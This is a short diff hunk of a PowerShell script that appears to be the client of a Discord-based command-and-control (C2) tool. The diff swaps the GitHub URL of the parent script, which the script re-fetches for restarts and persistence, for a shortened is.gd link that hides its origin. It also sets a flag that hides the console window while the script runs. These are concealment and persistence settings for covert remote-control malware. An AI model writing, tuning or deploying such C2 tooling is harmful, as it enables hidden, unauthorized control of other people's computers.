@@ -11,7 +11,7 @@ $response = $null
 $previouscmd = $null
 $authenticated = 0
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
-$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $InfoOnConnect = 1
 
